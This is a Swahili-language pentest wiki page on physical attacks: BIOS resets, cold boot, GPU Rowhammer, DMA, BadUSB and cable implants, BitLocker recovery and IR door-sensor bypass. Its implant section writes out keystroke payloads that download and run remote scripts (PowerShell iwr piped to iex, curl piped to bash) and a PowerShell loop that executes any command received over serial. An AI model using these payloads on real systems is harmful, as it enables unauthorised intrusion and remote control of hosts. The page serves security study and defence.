# Mashambulizi ya Kimaumbile

{{#include ../banners/hacktricks-training.md}}

## Kurejesha Nenosiri la BIOS na Usalama wa Mfumo

Mipangilio ya firmware ya PC za zamani inaweza kuwekwa upya kwa kukata betri ya CMOS au kutumia jumper ya clear-CMOS iliyoandikwa kwenye nyaraka. Muda unaohitajika wa kukata umeme hutegemea ubao husika, na manenosiri au funguo za kisasa za UEFI zinaweza kuhifadhiwa kwenye flash isiyopoteza data, kidhibiti kilichopachikwa, au kifaa cha usalama, na hivyo kubaki hata baada ya betri kuondolewa. Angalia mwongozo wa ubao/huduma kabla ya kuunganisha pini kwa kifupi; utaratibu huu pia unaweza kubatilisha vipimo vya TPM na kusababisha urejeshaji wa usimbaji wa diski.

Kwenye mifumo ya zamani ya x86, zana kama **killCMOS** na **CmosPwd** zinaweza kukagua au kubadilisha mipangilio inayohifadhiwa kwenye CMOS kupitia mazingira ya bootable. CmosPwd hutambua miundo ya manenosiri kutoka kwa seti iliyoandikwa ya familia za zamani za BIOS, na inaweza kuhifadhi nakala, kurejesha, au kufuta/kuua hali ya CMOS; matoleo yake yaliyochapishwa yanalenga mazingira ya zamani ya DOS/Windows, Linux, FreeBSD, na NetBSD.<sup>[[18]](#references)</sup> Zana hizi si viondoa manenosiri vya jumla vya UEFI na zinahitaji ufikiaji wa kutosha wa maunzi/firmware.

Baadhi ya firmware za kompyuta mpakato huonyesha msimbo wa changamoto maalum wa mtengenezaji baada ya majaribio kadhaa ya nenosiri yaliyoshindwa. Hifadhidata kama [bios-pw.org](https://bios-pw.org) zinaweza kukokotoa manenosiri ya urejeshaji ya zamani ya watengenezaji kwa baadhi ya modeli, lakini mifumo mingi hufunga ufikiaji bila changamoto inayoweza kutumika kukokotoa nenosiri. Chukulia nenosiri lolote lililozalishwa kuwa mahususi kwa modeli, na epuka kufikisha vikomo vya majaribio vya kudumu.

### Usalama wa UEFI

Kwa mifumo ya kisasa ya **UEFI**, CHIPSEC inaweza kukagua ulinzi wa vigezo vya Secure Boot. Anza na ukaguzi usiobadilisha chochote ulio hapa chini; hali ya hiari ya `-a modify` hujaribu kimakusudi kuharibu vigezo, na inapaswa kutumiwa tu kwenye mfumo wa maabara unaoweza kurejeshwa. CHIPSEC yenyewe inaonya kwamba kiendeshi chake chenye haki za juu na ufikiaji wa kiwango cha chini wa maunzi havifai kwa vifaa vya mwisho vya uzalishaji.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## Uchambuzi wa RAM na Cold Boot Attacks

DRAM haipotezi kila biti mara moja refresh inaposimama. Kiwango cha kupotea kwa data hutofautiana sana kulingana na teknolojia ya moduli na halijoto; kupoza kunaweza kuhifadhi data yenye manufaa kwa muda mrefu zaidi kuliko kuzima na kuwasha upya bila kupoza. Cold-boot attack huwasha upya haraka hadi kwenye mazingira madogo ya kupata data au huhamisha moduli iliyopozwa, kunasa memory ghafi, na kurejesha funguo za kriptografia licha ya kupotea kwa biti. Zana ya kunakili diski si lazima iwe zana ya kunasa physical memory, na Volatility huchambua capture badala ya kuipata; tumia zana ya kupata data inayofaa kwa jukwaa na iliyothibitishwa.<sup>[[12]](#references)</sup>

---

## GPU Rowhammer Dhidi ya Page Tables

Mashambulizi ya kisasa ya GPU Rowhammer huwa na manufaa zaidi yanapolenga **metadata ya GPU virtual memory** badala ya buffer za kawaida. Utafiti wa hivi karibuni kuhusu **GDDR6 NVIDIA Ampere GPUs** unaonyesha kuwa mshambuliaji anayeendesha CUDA code bila ruhusa za juu anaweza kuunda mifumo ya hammering inayolenga GPU husika, kutumia **memory massaging** kuweka miundo ya paging kwenye safu zilizo hatarini, kisha kubadilisha biti kwenye **last-level page table** au **page directory** ya kati. Mara tu ingizo moja la tafsiri linapoharibika, mshambuliaji anaweza kuanzisha **usomaji/uandikaji holela wa GPU memory** na kisha kuelekeza shambulizi kwenye kuathiri host.<sup>[[1]](#references)[[2]](#references)</sup>

### Muundo wa Exploitation

1. **Chunguza safu zinazoweza kuhammeriwa** katika GDDR6 na unda mifumo ya hammering inayozingatia refresh/isiyo sare inayopita vizuizi vya ndani ya DRAM.
2. **Fanya massage ya GPU allocations** ili driver iweke miundo ya page-translation katika maeneo halisi yanayoweza kuhammeriwa badala ya kuihifadhi kwenye pool chaguomsingi iliyolindwa. Kwa vitendo, hii inaweza kumaanisha kumaliza eneo la low-memory page-table na kusambaza UVM mappings kubwa, zenye nafasi tupu na strides zinazodhibitiwa.
3. **Badilisha metadata ya tafsiri** kama vile biti za **PFN** au zinazohusiana na aperture ndani ya ingizo la page-table/page-directory, ili ukurasa pepe unaodhibitiwa na mshambuliaji uelekezwe kwenye kurasa za page-table, GPU memory yoyote, au system mappings zinazoonekana na host.
4. Tumia tena mapping iliyoghushiwa ili kuandika upya ingizo zaidi za tafsiri na kupandisha mashambulizi hadi **usomaji/uandikaji holela wa GPU memory** katika GPU contexts mbalimbali.

### Kuelekeza Shambulizi kwa Host na Mitigations

- **IOMMU ikiwa imezimwa**, forged system-aperture mappings zinaweza kufichua **host physical memory** yoyote kwa GPU, na kubadilisha uwezo wa GPU kuwa kuathiri host kikamilifu.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** hulenga ingizo za last-level page-table, ilhali **GeForge** inaonyesha kuwa kuharibu kiwango cha page-directory kunaweza kuwa rahisi zaidi kwa sababu kubadilisha biti moja kunaweza kuelekeza upya tawi kubwa la tafsiri. Usichukulie kiwango kimoja tu cha paging kuwa muhimu kwa usalama.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** bado ni muhimu kwa sababu huzuia njia ya moja kwa moja ya kufikia host memory yoyote inayotumiwa na GDDRHammer/GeForge, lakini **si mitigation kamili**. **GPUBreach** inaonyesha njia ya pili ya kuelekeza shambulizi: mshambuliaji huharibu CPU buffers zinazoweza kuandikwa na GPU na zinazomilikiwa na driver, kisha husababisha hitilafu za usalama wa memory kwenye NVIDIA driver ili kupata uwezo wa kuandika kernel na **root shell**, hata IOMMU ikiwa imewezeshwa.<sup>[[3]](#references)</sup>
- **System-level ECC** ni hatua ya kuimarisha usalama inayoweza kutekelezwa kwenye workstation/server GPUs zinazoiunga mkono. Consumer GPUs zisizo na ECC zina eneo dhaifu zaidi la ulinzi.<sup>[[4]](#references)</sup>
- Mashambulizi haya si ya kinadharia tu: **GeForge** iliripoti mabadiliko ya biti **1,171** kwenye RTX 3060 na **202** kwenye RTX A6000, ambayo yalitosha kuunda mnyororo wa kufanya kazi wa kupandisha ruhusa za host.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Mashambulizi ya Direct Memory Access (DMA)

Kwa offline UEFI IFR/NVRAM patching inayoweza kushusha kiwango cha utekelezaji wa IOMMU kabla ya boot na kuwezesha Windows DMA chain, tazama:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** inaonyesha **upatikanaji na urekebishaji wa memory kwa DMA** kupitia interfaces kama FireWire na usanidi wa awali wa Thunderbolt, ikijumuisha saini za kihistoria za kuruka login. Si kwamba “haifanyi kazi dhidi ya Windows 10” tu: uwezekano wa kufanikiwa kwa exploit hutegemea interface, build lengwa, sera ya IOMMU, hali ya kufuli, na kama Windows Kernel DMA Protection inaungwa mkono na imewashwa. Windows 10 version 1803 na matoleo ya baadaye yalileta Kernel DMA Protection kwenye platforms zinazooana, na kubadilisha kwa kiasi kikubwa eneo la mashambulizi.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB kwa Ufikiaji wa Mfumo

Kwenye Windows volume ambayo haijasimbwa kwa njia fiche au ambayo tayari imefunguliwa, mazingira ya offline yanaweza kubadilisha accessibility binaries kama **sethc.exe** au **Utilman.exe** na kuweka **cmd.exe**, na hivyo kutoa command prompt ya SYSTEM pale shortcut inayolingana kwenye skrini ya kuingia inapotumiwa. Zana kama **chntpw** zinaweza kuhariri data ya akaunti za ndani ya SAM. Mbinu hizi haziruki BitLocker volume iliyofungwa na zinaweza kuharibu credentials zinazolindwa na DPAPI/EFS; hifadhi nakala za forensic na backups.

**Kon-Boot** ni zana ya kibiashara ya kuruka uthibitishaji wakati wa boot kwa usanidi wa Windows/macOS unaoungwa mkono. Uoanifu hutegemea OS, hali ya firmware, Secure Boot, na usanidi wa usimbaji fiche wa diski; haiwezi kusimbua BitLocker volume iliyofungwa.<sup>[[10]](#references)</sup>

---

## Kushughulikia Vipengele vya Usalama vya Windows

### Njia za Mkato za Boot na Recovery

- **Delete/Supr**, F2, F10, au kitufe kingine cha mtengenezaji kinaweza kufungua firmware setup.
- **F8** huingiza legacy Windows advanced boot options kwenye usanidi tu ambako njia hiyo bado imewezeshwa; njia ya sasa ya kuingia recovery hutofautiana.
- Kushikilia **Shift** kunaweza kuzuia Windows kuingia kiotomatiki katika baadhi ya usanidi, ingawa mipangilio ya sera/registry inaweza kuzima tabia hiyo.<sup>[[17]](#references)</sup>

### Vifaa vya BAD USB

Vifaa kama **USB Rubber Ducky** na Teensy boards vinaweza kujitambulisha kama trusted HID keyboards na kuingiza mibofyo ya vitufe iliyofafanuliwa awali. Payload huanza ikiwa na ruhusa na ufikiaji wa desktop wa session iliyoingia; maombi ya UAC, kufungwa kwa skrini, mpangilio wa keyboard, muda wa utekelezaji, na sera ya USB ya endpoint bado huiwekea mipaka.<sup>[[15]](#references)</sup>

Peripherals zinazopangika zinaweza pia kushambulia host kernel parsers na kuratibu vifaa kadhaa vya USB kwa heap grooming na ufichuaji wa taarifa:

{{#ref}}
../binary-exploitation/linux-kernel-exploitation/usb-audio-descriptor-oob-kaslr-leak.md
{{#endref}}

### Volume Shadow Copy

Ruhusa za administrator au backup zinaweza kutumika kuunda shadow copy au kuhifadhi registry hives ili faili zilizofungwa kama **SAM** na **SYSTEM** ziweze kupatikana. Hii ni mbinu ya kukusanya data baada ya kuathiri mfumo, si njia ya kuruka ruhusa za juu, na inapaswa kulinganishwa na matukio ya `diskshadow`/VSS na uhamishaji wa registry-hive.

## Mbinu za BadUSB / HID Implant

### Android HID gadget inayochochewa na NFC

Simu ya Android iliyofanyiwa root inaweza kuwa keyboard ya USB inayopangika tu ikiwa USB controller na kernel yake zina **USB gadget/HID support**. Kwenye vifaa vinavyooana, Kali NetHunter hutoa gadget profiles kupitia **USB Arsenal**. Chaguo jingine ni [USB Gadget Tool](https://github.com/tejado/android-usb-gadget), ambayo huunda ConfigFS gadget functions na inaweza kufichua character devices za keyboard/mouse kama `/dev/hidg0` na `/dev/hidg1`. Zana hii huunda tu gadget endpoint; mchakato tofauti lazima uandike HID reports humo. Ufikiaji wa root hauwezi kufidia kernel isiyo na ConfigFS, HID gadget support, au USB Device Controller inayoweza kutumika.<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

Endpoint hii inaweza kuunganishwa na Android NFC kama kichocheo cha kimwili. Programu ya [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID) husoma tag UID, huibadilisha kuwa muundo inayotarajia, hukagua whitelist ya ndani, na hutuma mfuatano wa vitufe uliosanidiwa wa mtindo wa Rubber Ducky baada ya UID kulingana. Host iliyounganishwa huona ingizo la kawaida la keyboard na haihitaji programu ya NFC.<sup>[[22]](#references)[[24]](#references)</sup>

Thibitisha uunganishaji na mpangilio wa keyboard kwenye text editor tupu kabla ya kutumia shortcuts au commands. Payload isiyo na madhara ni:<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

Mipaka muhimu ya uaminifu:<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- **Orodha ya ruhusa ya UID ni utambuzi, si uthibitishaji**. UID ni za umma, na baadhi ya aina za tokeni au emulator huruhusu kunakili au kuiga. UID iliyoruhusiwa ikinakiliwa hupitia njia ileile ya usambazaji kama tokeni ya awali.
- Moduli ya Magisk ya **NfcScreenOff** hurekebisha huduma ya NFC ili ifanye kazi kana kwamba skrini imewashwa na kufunguliwa. Ikiwa simu tayari imeunganishwa kwa host, mtu anaweza kuanzisha payload bila kufungua simu.
- Password, API tokeni na amri zilizohifadhiwa kwenye payload zinaweza kurejeshwa kutoka kwenye kifaa kilicho na root au bootloader iliyofunguliwa. Kuandika password kupitia HID ni uotomatishaji wa kutumia tena password, si uthibitishaji usiohitaji password.
- Uingizaji wa HID hutumia ruhusa za desktop inayotumika, na hutegemea focus, muda na mpangilio wa kibodi wa host. Hitaji uthibitisho wa hivi karibuni kutoka kwa mtumiaji kabla ya kutekeleza vitendo nyeti, epuka kuweka siri zenye ruhusa za juu kwenye script, na tumia kifaa cha uthibitishaji cha cryptographic challenge-response kwa uthibitishaji halisi.

### Implants za kebo zinazodhibitiwa kupitia Wi-Fi

- Implants zinazotumia ESP32-S3, kama **Evil Crow Cable Wind**, hujificha ndani ya nyaya za USB-A→USB-C au USB-C↔USB-C, hujitambulisha kama kibodi ya USB pekee, na hutoa mfumo wake wa C2 kupitia Wi-Fi. Mwendeshaji anahitaji tu kuwasha kebo kwa kuichomeka kwenye host ya mwathiriwa, kuunda hotspot inayoitwa `Evil Crow Cable Wind` yenye password `123456789`, kisha kufungua [http://cable-wind.local/](http://cable-wind.local/) (au anwani yake ya DHCP) ili kufikia kiolesura cha HTTP kilichopachikwa.<sup>[[8]](#references)</sup>
- Kiolesura cha kivinjari kina tab za *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* na *Config*. Payload zilizohifadhiwa huwekewa lebo kulingana na OS, mipangilio ya kibodi hubadilishwa papo hapo, na mfuatano wa VID/PID unaweza kubadilishwa ili kuiga vifaa vya pembeni vinavyojulikana.
- Kwa kuwa C2 imo ndani ya kebo, simu inaweza kuweka payload, kuanzisha utekelezaji na kudhibiti taarifa za kuingia za Wi-Fi bila kutumia mtandao wa shirika—jambo linalofaa kwa uvamizi wa kimwili wa muda mfupi.

### Payload za AutoExec zinazotambua OS

- Sheria za AutoExec huunganisha payload moja au zaidi ili zitekelezwe mara moja baada ya USB kutambuliwa. Implant hutambua OS kwa njia nyepesi na kuchagua script inayolingana.
- Mfano wa mtiririko wa kazi:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) au `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Kwa kuwa utekelezaji hufanyika bila mtu kuusimamia, kubadilisha kebo ya kuchaji tu kunaweza kupata ufikiaji wa awali wa “plug-and-pwn” kwa kutumia muktadha wa mtumiaji aliyeingia.

### Shell ya mbali inayowashwa na HID kupitia Wi-Fi TCP

1. **Kuanzisha kwa vibonye:** Payload iliyohifadhiwa hufungua console na kubandika mzunguko unaotekeleza chochote kinachopokelewa kupitia kifaa kipya cha serial cha USB. Toleo rahisi la Windows ni:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Cable bridge:** Implant huweka channel ya USB CDC wazi huku ESP32-S3 yake ikianzisha TCP client (script ya Python, APK ya Android, au executable ya desktop) inayounganisha tena na operator. Byte zozote zinazoandikwa kwenye TCP session hutumwa kwenye serial loop iliyoelezwa hapo juu, hivyo kuwezesha remote command execution hata kwenye hosts zisizounganishwa na mtandao. Output ni chache, kwa hiyo operators kwa kawaida huendesha commands bila kuona matokeo (kuunda akaunti, kuweka tooling ya ziada, n.k.).

### Uso wa HTTP OTA update

- Interface ya Evil Crow Cable Wind iliyoandikwa kwenye nyaraka huweka wazi endpoint ya firmware-update isiyohitaji uthibitishaji katika `/update`:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Waendeshaji wa uwanjani wanaweza kubadilisha vipengele wakati kifaa kimewashwa (kwa mfano, kuweka firmware ya flash USB Army Knife) katikati ya operesheni bila kufungua kebo. Hii huruhusu implant kubadili na kutumia uwezo mpya ikiwa bado imeunganishwa kwenye host inayolengwa.

## Kukwepa Usimbaji Fiche wa BitLocker

Upataji wa kiuchunguzi ulioidhinishwa wa mfumo unaotumika au uliotumika hivi karibuni unaweza kuwa na ufunguo mkuu wa volume ya BitLocker au nyenzo nyingine zinazohusiana na ufunguo wakati volume haijafungwa. Zana za kibiashara kama Elcomsoft Forensic Disk Decryptor na Passware Kit Forensic zinaweza kutafuta kwenye picha za kumbukumbu, faili za hibernation au crash dumps zinazotumika, lakini mafanikio hayajahakikishwa. Windows za kisasa pia husimba crash dumps fiche BitLocker inapowashwa, na nenosiri la urejeshaji lenye tarakimu 48 lililohifadhiwa ni kifaa tofauti na ufunguo wa volume ulio kwenye kumbukumbu.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Uhandisi wa Kijamii wa Kuongeza Ufunguo wa Urejeshaji

Mshambuliaji anayemshawishi msimamizi kutekeleza amri za usimamizi wa BitLocker anaweza kuongeza protector ya nenosiri la urejeshaji, ufunguo wa nje au protector nyingine, kisha kuinasa. Nenosiri la urejeshaji haliwezi kuwa mfuatano wowote wa sufuri: manenosiri ya urejeshaji ya nambari ya BitLocker yana muundo uliothibitishwa wa tarakimu 48. Sintaksia husika ya usimamizi ulioidhinishwa ni `manage-bde -protectors -add C: -recoverypassword`; orodhesha protectors zilizoongezwa kwa `manage-bde -protectors -get C:`. Fuatilia nyongeza za protectors na uhakikishe kuwa nyenzo mpya za urejeshaji zinahifadhiwa tu katika maeneo yaliyoidhinishwa.<sup>[[16]](#references)</sup>

---

## Kutumia Swichi za Kuingiliwa kwa Chassis / Matengenezo Kuweka BIOS katika Hali Chaguomsingi ya Kiwandani

Kompyuta mpakato nyingi za kisasa na kompyuta za mezani za umbo dogo zina **swichi ya kuingiliwa kwa chassis** inayofuatiliwa na Embedded Controller (EC) na firmware ya BIOS/UEFI. Ingawa lengo kuu la swichi hiyo ni kutoa tahadhari kifaa kinapofunguliwa, wakati mwingine watengenezaji hutekeleza **njia ya mkato ya urejeshaji isiyoandikwa rasmi** inayowashwa swichi inapobadilishwa kwa mpangilio maalum.<sup>[[5]](#references)[[6]](#references)</sup>

### Jinsi Shambulio Linavyofanya Kazi

1. Swichi imeunganishwa kwenye **kiingilio cha GPIO** cha EC.
2. Firmware inayoendeshwa kwenye EC hufuatilia **muda na idadi ya mibofyo**.
3. Muundo uliowekwa moja kwa moja kwenye msimbo unapotambuliwa, EC huita utaratibu wa *mainboard-reset* unaofuta **maudhui ya NVRAM/CMOS ya mfumo**.
4. Katika uwashaji unaofuata, modeli zilizoathiriwa hupakia hali ya firmware iliyowekwa upya. Kulingana na mtengenezaji na toleo, hali iliyofutwa inaweza kujumuisha nenosiri la msimamizi, mipangilio maalum ya kuwasha au funguo za Secure Boot zilizosajiliwa; hali ya TPM na athari za usimbaji fiche wa diski lazima zitathminiwe kando.

> Kuweka upya firmware kunaweza kurejesha chaguo za kuwasha kutoka kwenye kifaa cha nje, lakini **hakufungui usimbaji fiche wa hifadhi**. BitLocker au mfumo mwingine wa usimbaji fiche wa diski nzima unaweza kuingia katika hali ya urejeshaji baada ya mabadiliko ya TPM/firmware na bado ukalinda diski ya ndani bila ufunguo wa urejeshaji.<sup>[[16]](#references)</sup>

### Mfano Halisi – Kompyuta Mpakato ya Framework 13

Njia ya mkato ya urejeshaji ya Framework 13 (kizazi cha 11/12/13) ni:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

Baada ya mzunguko wa kumi, EC huweka alama inayoelekeza BIOS kufuta NVRAM wakati wa kuwasha upya kunakofuata. Utaratibu wote huchukua takriban sekunde 40 na hauhitaji **chochote isipokuwa bisibisi**.<sup>[[5]](#references)</sup>

### Utaratibu wa Jumla wa Exploitation

1. Washa kifaa lengwa au kiondoe kwenye hali ya kusimamishwa ili EC iwe inaendesha.
2. Ondoa kifuniko cha chini ili kufikia swichi ya kuingiliwa/utunzaji.
3. Rudia mpangilio wa kuwasha/kuzima swichi maalum kwa mtengenezaji (angalia nyaraka, vikao, au fanya reverse-engineer ya firmware ya EC).
4. Kusanya tena kifaa na ukiwashe upya, kisha chunguza mipangilio ya firmware na credentials zilizobadilika.
5. Ikiwa una idhini na kuwasha kutoka kwenye kifaa cha nje kunawezekana, washa image ya live inayodhibitiwa. Baada ya kufungua kihalali volume ya ndani (au ikiwa haikuwahi kusimbwa), mazingira ya live yanaweza kupata credentials na data au kukagua EFI System Partition. Kurekebisha partition hiyo ili kusakinisha EFI implant ni hatua ya kudumu na inayoingilia sana, na bado huzuiwa na Secure Boot, measured boot, ulinzi wa uandishi wa firmware na ufuatiliaji wa endpoint. Hifadhi iliyosimbwa hubaki bila kufikiwa bila ufunguo wake au taarifa za kurejesha.

### Ugunduzi na Upunguzaji wa Hatari

* Rekodi matukio ya kuingiliwa kwenye chassis katika console ya usimamizi wa OS na uyalinganishe na uwekaji upya wa BIOS usiotarajiwa.
* Tumia **mihuri inayoonyesha dalili za kuchezewa** kwenye skrubu/vifuniko ili kugundua kufunguliwa.
* Hifadhi vifaa katika **maeneo yanayodhibitiwa kimwili**; chukulia ufikiaji wa kimwili kuwa sawa na kuathirika kikamilifu.
* Ikiwezekana, zima kipengele cha mtengenezaji cha “maintenance switch reset” au hitaji idhini ya ziada ya kriptografia kwa uwekaji upya wa NVRAM.

---

## Kudunga IR kwa Siri dhidi ya Vihisi vya Kutoka Bila Kugusa

### Sifa za Vihisi
- Vihisi vya kawaida vya “wave-to-exit” huunganisha emitter ya near-IR LED na moduli ya kupokea inayofanana na ya rimoti ya TV, ambayo huripoti logic high tu baada ya kupokea mipigo kadhaa (~4–10) ya carrier sahihi (≈30 kHz).<sup>[[7]](#references)</sup>
- Kifuniko cha plastiki huzuia emitter na receiver kutazamana moja kwa moja, kwa hivyo kidhibiti hudhani kuwa carrier yoyote iliyothibitishwa imetokana na mng’ao wa karibu na huwasha relay inayofungua kufuli la mlango.
- Kidhibiti kinapoamini kuwa kitu lengwa kipo, mara nyingi hubadilisha umbo la modulation ya mawimbi yanayotoka, lakini receiver huendelea kukubali mlipuko wowote unaolingana na carrier iliyochujwa.

### Mtiririko wa Shambulio
1. **Nasa wasifu wa utoaji wa mawimbi** – unganisha logic analyser kwenye pini za kidhibiti ili kurekodi mawimbi ya kabla na baada ya ugunduzi yanayoendesha IR LED ya ndani.
2. **Rudia mawimbi ya “baada ya ugunduzi” pekee** – ondoa/tenga emitter ya kawaida na uendeshe IR LED ya nje kwa kutumia muundo wa mawimbi ambao tayari umeanzishwa, tangu mwanzo. Kwa kuwa receiver hujali idadi/marudio ya mipigo pekee, huchukulia carrier bandia kuwa mng’ao halisi na huwasha laini ya relay.
3. **Dhibiti muda wa utumaji** – tuma carrier kwa milipuko iliyopangwa (kwa mfano, iwake kwa makumi ya milisekunde, kisha izime kwa muda unaokaribiana) ili kutoa idadi ya chini ya mipigo bila kujaza AGC ya receiver au mantiki yake ya kushughulikia mwingiliano. Utoaji wa mawimbi endelevu hupunguza haraka usikivu wa kihisi na kusimamisha relay kufanya kazi.

### Kudunga Mawimbi Yaliyoakisiwa kwa Umbali Mrefu
- Kubadilisha LED ya majaribio na IR diode yenye nguvu nyingi, kiendeshi cha MOSFET na optiki za kulenga huwezesha kuwasha kifaa kwa uhakika kutoka umbali wa takriban mita 6.
- Mshambuliaji hahitaji kuwa na line-of-sight ya tundu la receiver; kuelekeza mwale kwenye kuta za ndani, rafu au fremu za milango zinazoonekana kupitia kioo huruhusu nishati iliyoakisiwa kuingia kwenye eneo la takriban 30° la mtazamo na kuiga ishara ya mkono iliyo karibu.
- Kwa kuwa receivers hutazamia mng’ao dhaifu pekee, mwale wa nje wenye nguvu zaidi unaweza kuruka kutoka kwenye nyuso kadhaa na bado kuzidi kiwango cha ugunduzi.

### Tochi ya Shambulio Iliyobadilishwa
- Kuficha kiendeshi ndani ya tochi ya kawaida ya dukani huficha kifaa waziwazi. Badilisha LED inayoonekana na IR LED yenye nguvu nyingi inayolingana na bendi ya receiver, ongeza ATtiny412 (au kifaa sawa) ili kutoa mipigo ya ≈30 kHz, na utumie MOSFET kupitisha mkondo wa LED hadi ardhini.
- Lenzi ya zoom ya darubini hukaza mwale kwa umbali/usahihi, huku mota ya mtetemo inayodhibitiwa na MCU ikitoa uthibitisho wa mguso kwamba modulation inafanya kazi bila kutoa mwanga unaoonekana.
- Kubadilisha kati ya mifumo kadhaa ya modulation iliyohifadhiwa (marudio ya carrier na maumbo ya mawimbi yanayotofautiana kidogo) huongeza uoanifu katika familia za vihisi vilivyopewa chapa upya, na kumwezesha mtumiaji kufagia nyuso zinazoakisi hadi relay isikike ikibofya na mlango kufunguka.

---

## References

- [1] [GDDRHammer: Kuvuruga Safu za DRAM kwa Kiwango Kikubwa — Mashambulio ya Rowhammer kati ya Vipengele kutoka kwa GPU za Kisasa](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Kupiga GDDR Memory ili Kutengeneza Jedwali za Kurasa za GPU kwa Burudani na Faida](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Mashambulio ya Kuongeza Haki kwenye GPU kwa kutumia Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Notisi ya Usalama: Rowhammer - Julai 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Bonyeza hapa ili ku-hack”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mwongozo wa Kuweka Upya Mainboard](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Hapanaaa, Usiguse! – Kukwepa Vihisi vya IR vya Kutoka Bila Kugusa kwa Tochi ya IR ya Siri”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Chomeka, Cheza, Hack: Kudukua kwa kutumia Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Shambulio la Rowhammer dhidi ya Chip za NVIDIA](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Nyaraka rasmi za Kon-Boot na taarifa za uoanifu](https://kon-boot.com/)
- [11] [Nyaraka za CHIPSEC - Ulinzi wa vigezo vya Secure Boot](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Tusisahau: Mashambulio ya Cold Boot dhidi ya Funguo za Usimbaji](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - Ubadilishaji wa kumbukumbu halisi kupitia DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Ulinzi wa Kernel DMA](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Nyaraka za Hak5 USB Rubber Ducky](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - Mwongozo wa utendakazi wa BitLocker](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - Kushikilia Shift na tabia ya kuingia kiotomatiki](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - Nyaraka na vipakuliwa vya CmosPwd](https://www.cgsecurity.org/wiki/CmosPwd)
- [19] [Nyaraka za Kali Linux - NetHunter USB-Arsenal](https://www.kali.org/docs/nethunter/nethunter-usbarsenal/)
- [20] [Nyaraka za Linux kernel - Kiendeshi cha USB HID gadget](https://docs.kernel.org/usb/gadget_hid.html)
- [21] [USB Gadget Tool](https://github.com/tejado/android-usb-gadget)
- [22] [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)
- [23] [NfcScreenOff](https://github.com/Jon8RFC/NfcScreenOff)
- [24] [Badilisha Simu ya Android yenye Root Kuwa Kithibitishaji cha NFC na Zana ya Uotomatishaji kwa Kompyuta Yako](https://mobile-hacker.com/2026/09/21/turn-a-rooted-android-phone-into-an-nfc-authenticator-and-automation-tool-for-your-pc/)
{{#include ../banners/hacktricks-training.md}}
